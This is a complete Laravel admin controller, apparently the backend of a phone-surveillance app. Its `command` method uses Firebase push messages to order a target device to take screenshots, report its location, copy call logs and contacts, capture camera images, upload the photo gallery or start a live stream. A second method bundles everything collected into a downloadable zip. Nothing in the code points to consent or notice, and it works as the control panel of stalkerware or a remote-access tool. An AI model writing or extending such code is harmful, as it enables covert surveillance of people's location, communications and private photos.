<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;

class UserController extends Controller
{
    public function index()
    {
        $users = User::latest()->paginate(10);
        return view('admin.users.index', compact('users'));
    }

    public function show(User $user)
    {
        // Load relationships needed for the view
        $user->load(['device_logs' => function($query) {
            $query->latest()->take(50);
        }, 'media', 'backups']);
        
        return view('admin.users.show', compact('user'));
    }

    public function command(Request $request, User $user, $type)
    {
        $data = $request->all();
        $payload = null;
        $fcmAction = $type;

        // Map types to FCM actions and validate payload
        switch ($type) {
            case 'screenshot':
            case 'request_location':
            case 'backup_call_log':
            case 'backup_contacts':
                // No extra payload needed
                break;
            case 'capture_image':
                $payload = ['camera_facing' => $data['camera_facing'] ?? 'back'];
                break;
            case 'backup_gallery':
                $payload = ['media_type' => $data['media_type'] ?? 'all'];
                break;
            case 'start_stream':
                // special handling below
                break;
            default:
                return response()->json(['error' => 'Invalid command'], 400);
        }

        // Create Command Log
        $log = \App\Models\CommandLog::create([
            'user_id' => $user->id,
            'admin_id' => auth()->id(),
            'command' => $type,
            'status' => 'pending',
            'payload' => $payload,
        ]);

        if (!$user->fcm_token) {
            return response()->json(['error' => 'User has no FCM Token'], 400);
        }

        try {
            // Setup Google Auth
            $credentialsPath = storage_path('app/firebase_credentials.json');
            if (!file_exists($credentialsPath)) return response()->json(['error' => 'Firebase credentials missing'], 500);
            
            $credentials = new \Google\Auth\Credentials\ServiceAccountCredentials(
                'https://www.googleapis.com/auth/firebase.messaging',
                $credentialsPath
            );
            $token = $credentials->fetchAuthToken();
            $jsonKey = json_decode(file_get_contents($credentialsPath), true);
            $projectId = $jsonKey['project_id'];

            // Prepare Data
            $fcmData = [
                'action' => $fcmAction,
                'command_id' => (string) $log->id,
            ];
            
            if ($payload) {
                $fcmData = array_merge($fcmData, $payload);
            }

            // Special Case: Start Stream
            if ($type === 'start_stream') {
                $stream = \App\Models\LiveStream::create([
                    'user_id' => $user->id,
                    'status' => 'active',
                    'started_at' => now(),
                ]);
                $fcmData['live_stream_id'] = (string) $stream->id;
                
                // Send FCM
                $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);
                
                return response()->json([
                    'success' => true, 
                    'message' => 'Stream started',
                    'stream_url' => route('admin.streams.show', $stream->id) 
                ]);
            }

            // Standard Send
            $this->sendFcm($projectId, $token['access_token'], $user->fcm_token, $fcmData);

            return response()->json(['success' => true, 'message' => 'Command sent successfully']);

        } catch (\Exception $e) {
            return response()->json(['error' => $e->getMessage()], 500);
        }
    }

    public function downloadZip(User $user)
    {
        // 1. Setup Environment for Huge Data
        set_time_limit(0);
        ini_set('memory_limit', '512M'); // Only needs enough for DB cursors

        // Verify Library
        if (!class_exists('\\ZipStream\\ZipStream')) {
            return back()->with('error', 'Please run "composer install" on your server.');
        }

        $zipName = "full_backup_" . str_replace(' ', '_', $user->name) . "_" . $user->id . ".zip";

        // 2. Clear AND Close Output Buffers (Crucial for streaming)
        while (ob_get_level()) {
            ob_end_clean();
        }

        // 3. Raw PHP Headers (Bypass Laravel to prevent buffering)
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipName . '"');
        header('Pragma: no-cache');
        header('Expires: 0');

        // 4. Stream directly to output
        $options = new \ZipStream\Option\Archive();
        $options->setSendHttpHeaders(false); // We sent them manually
        $options->setEnableHttpCompression(false); // Vital for speed & reliability

        $zip = new \ZipStream\ZipStream(
            outputStream: fopen('php://output', 'wb'),
            options: $options
        );

        // 5. Stream Media using Cursor (Saves RAM)
        foreach ($user->media()->cursor() as $media) {
            if ($media->file_path) {
                $fullPath = storage_path('app/public/' . $media->file_path);
                if (!file_exists($fullPath)) {
                    $fullPath = base_path('storage/app/public/' . $media->file_path);
                }

                if (file_exists($fullPath) && !is_dir($fullPath)) {
                    $folder = ucfirst($media->category ?? 'Media');
                    $name = $media->id . "_" . basename($media->file_path);
                    
                    try {
                        $zip->addFileFromPath("Images/{$folder}/{$name}", $fullPath);
                        flush(); // Send to browser immediately
                    } catch (\Exception $e) {
                        continue; // Skip corrupted files
                    }
                }
            }
        }

        // 6. Stream Backups
        foreach ($user->backups()->cursor() as $backup) {
            $type = ucfirst($backup->type);
            if ($backup->file_path) {
                $fullPath = storage_path('app/public/' . $backup->file_path);
                if (file_exists($fullPath)) {
                    try {
                        $zip->addFileFromPath("Data_Backups/{$type}/" . basename($backup->file_path), $fullPath);
                        flush();
                    } catch (\Exception $e) { continue; }
                }
            } elseif (!empty($backup->data)) {
                $zip->addFile("Data_Backups/{$type}/{$backup->type}_" . time() . ".json", $backup->data);
                flush();
            }
        }

        // 7. Complete and Exit
        $zip->finish();
        exit(); 
    }

    private function sendFcm($projectId, $accessToken, $deviceToken, $data)
    {
        $client = new \GuzzleHttp\Client();
        $client->post("https://fcm.googleapis.com/v1/projects/{$projectId}/messages:send", [
            'headers' => [
                'Authorization' => 'Bearer ' . $accessToken,
                'Content-Type' => 'application/json',
            ],
            'json' => [
                'message' => [
                    'token' => $deviceToken,
                    'data' => $data,
                ],
            ],
        ]);
    }
}
